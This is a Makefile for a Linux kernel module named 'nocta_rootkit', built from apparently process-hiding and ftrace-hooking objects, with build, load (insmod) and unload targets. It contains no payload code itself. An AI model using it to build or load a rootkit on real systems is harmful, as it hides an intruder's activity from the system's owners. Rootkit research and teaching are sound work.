modname := nocta_rootkit
obj-m := $(modname).o


nocta_rootkit-objs := hide_pid.o ftrace_helper.o
KVERSION = $(shell uname -r)
KDIR := /lib/modules/$(KVERSION)/build

ifdef DEBUG
CFLAGS_$(obj-m) := -DDEBUG
endif

all:
	make -C $(KDIR) M=$(PWD) modules

clean:
	make -C $(KDIR) M=$(PWD) clean

load:
	insmod $(modname).ko

unload:
	rmmod $(modname)
